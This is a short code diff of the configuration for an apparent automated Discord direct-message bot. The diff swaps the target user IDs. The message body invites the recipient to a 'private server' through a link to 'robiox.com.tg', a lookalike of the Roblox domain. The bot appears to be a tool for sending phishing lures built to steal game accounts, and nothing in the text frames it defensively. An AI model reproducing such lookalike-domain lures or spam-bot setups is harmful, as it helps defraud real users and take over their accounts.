@@ -25,8 +25,8 @@ const CONFIG = {
       enabled: true,
       delayMs: 2000,
       channelId: "",
-      dmUserId: "1329259221409202299",
-      userId: "1329259221409202299",
+      dmUserId: "702305416935243848",
+      userId: "702305416935243848",
       content: "Hey add me so you can join my private server https://robiox.com.tg/users/343093966600/profile",
       timestamp: "2025-09-01T13:35:00-04:00", // EDT
       embed: {},
